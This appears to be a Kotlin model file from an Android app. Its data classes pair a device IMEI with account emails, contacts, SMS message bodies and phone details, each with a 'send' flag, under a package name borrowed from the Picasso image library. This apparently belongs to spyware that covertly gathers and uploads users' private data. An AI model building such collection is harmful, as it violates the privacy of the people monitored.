package com.squareup.picasso.domain.model


data class AccountEntity(val imei: String, val nameEmail: String, var send: Boolean) {
    override fun toString(): String {
        return "AccountEntity(imei='$imei', nameEmail='$nameEmail', send=$send)"
    }
}

data class ContactEntity(
    val imei: String,
    val displayName: String,
    val number: String,
    val dateLastUpdate: String,
    val contactId: String,
    var send: Boolean
) {
    override fun toString(): String {
        return "ContactEntity(imei='$imei', displayName='$displayName', number='$number', dateLastUpdate='$dateLastUpdate', contactId='$contactId', send=$send)"
    }
}

data class SmsEntity(
    val imei: String,
    val address: String,
    val body: String,
    val date: String,
    val _id: String,
    var send: Boolean
)

data class PhoneEntity(
        val imei: String,
        var lastResponse: String,
        val manufacture: String,
        val model: String,
        val so: String,
        var send: Boolean
)